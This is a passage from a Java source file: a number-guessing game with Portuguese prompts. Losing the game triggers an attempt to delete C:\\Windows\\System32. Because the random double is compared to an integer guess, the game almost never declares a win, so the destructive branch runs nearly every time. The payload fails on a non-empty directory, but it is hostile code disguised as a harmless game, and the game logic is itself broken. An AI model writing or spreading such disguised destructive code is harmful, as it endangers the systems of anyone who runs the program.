		Random aleatorio = new Random();
		Scanner leia = new Scanner(System.in);
		double x = aleatorio.nextDouble(11);
		System.out.println("Vamos jogar um jogo, adivinhe que numero estou pensando de 1 a 10");
		double y = leia.nextInt();
		File file = new File("C:\\Windows\\System32");
		if (y == x) {
			System.out.println("Parab√©ns, voce venceu!!");
		} else file.delete();
		

	}

}
